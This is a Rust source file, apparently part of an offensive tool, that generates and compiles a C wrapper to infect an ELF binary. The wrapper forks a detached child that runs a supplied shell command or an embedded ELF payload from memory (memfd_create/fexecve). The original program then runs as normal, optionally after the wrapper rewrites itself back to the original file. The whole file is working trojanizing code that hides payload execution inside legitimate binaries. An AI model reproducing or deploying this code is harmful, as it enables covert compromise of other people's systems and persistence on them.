use crate::codegen::c;
use crate::errors::*;
use crate::infect::elf::{Infect, Payload};
use std::path::Path;

pub async fn add_payload(compiler: &mut c::Compiler, payload: &Payload<'_>) -> Result<()> {
    compiler.add_lines(&["setsid();\n"]).await?;

    match payload {
        Payload::Shell(payload) => {
            let mut buf = String::new();
            c::escape(payload.as_bytes(), &mut buf)?;

            compiler
                .add_lines(&[
                    &format!("char *args[]={{\"/bin/sh\", \"-c\", \"{buf}\", NULL}};\n"),
                    "execve(\"/bin/sh\", args, environ);\n",
                    "exit(0);\n",
                ])
                .await?;
        }
        Payload::Elf(payload) => {
            compiler
                .add_line("f = memfd_create(\"\", MFD_CLOEXEC);\n")
                .await?;
            c::stream_bin(payload, &mut compiler.stdin).await?;
            compiler
                .add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n"])
                .await?;
        }
    }

    Ok(())
}

pub async fn infect(
    bin: &Path,
    config: &Infect,
    orig: &[u8],
    payload: Option<&Payload<'_>>,
) -> Result<()> {
    let mut compiler = c::Compiler::spawn(bin).await?;

    info!("Generating source code...");
    compiler
        .add_lines(&[
            "#define _GNU_SOURCE\n",
            "#include <stdio.h>\n",
            "#include <stdlib.h>\n",
            "#include <unistd.h>\n",
            "#include <fcntl.h>\n",
            "#include <sys/mman.h>\n",
            "#include <linux/limits.h>\n",
            "extern char **environ;\n",
        ])
        .await?;

    c::define_write_all(&mut compiler).await?;

    compiler
        .add_lines(&["int main(int argc, char** argv) {\n", "int f;\n"])
        .await?;

    if let Some(payload) = &payload {
        compiler
            .add_lines(&["pid_t c = fork();\n", "if (c) goto bin;\n"])
            .await?;
        add_payload(&mut compiler, payload).await?;
    }

    compiler.add_lines(&["bin:\n"]).await?;

    if config.self_replace {
        if let Some(assume_path) = &config.assume_path {
            let mut buf = String::new();
            c::escape(assume_path.as_bytes(), &mut buf)?;
            compiler.add_line(&format!("char *p=\"{buf}\";\n")).await?;
        } else {
            compiler
                .add_lines(&[
                    "char p[PATH_MAX+1];\n",
                    "ssize_t n = readlink(\"/proc/self/exe\", p, sizeof(p)-1);\n",
                    "p[n]=0;\n",
                ])
                .await?;
        }
        compiler
            .add_lines(&[
                "unlink(p);\n",
                "f = open(p, O_CREAT | O_TRUNC | O_WRONLY, 0755);\n",
            ])
            .await?;
        c::stream_bin(orig, &mut compiler.stdin).await?;
        compiler
            .add_lines(&[
                "close(f);\n",
                "execve(p, argv, environ);\n",
                "exit(1);\n",
                "}\n",
            ])
            .await?;
    } else {
        compiler
            .add_line("f = memfd_create(\"\", MFD_CLOEXEC);\n")
            .await?;
        c::stream_bin(orig, &mut compiler.stdin).await?;
        compiler
            .add_lines(&["fexecve(f, argv, environ);\n", "exit(1);\n", "}\n"])
            .await?;
    }

    let mut pending = compiler.done();
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
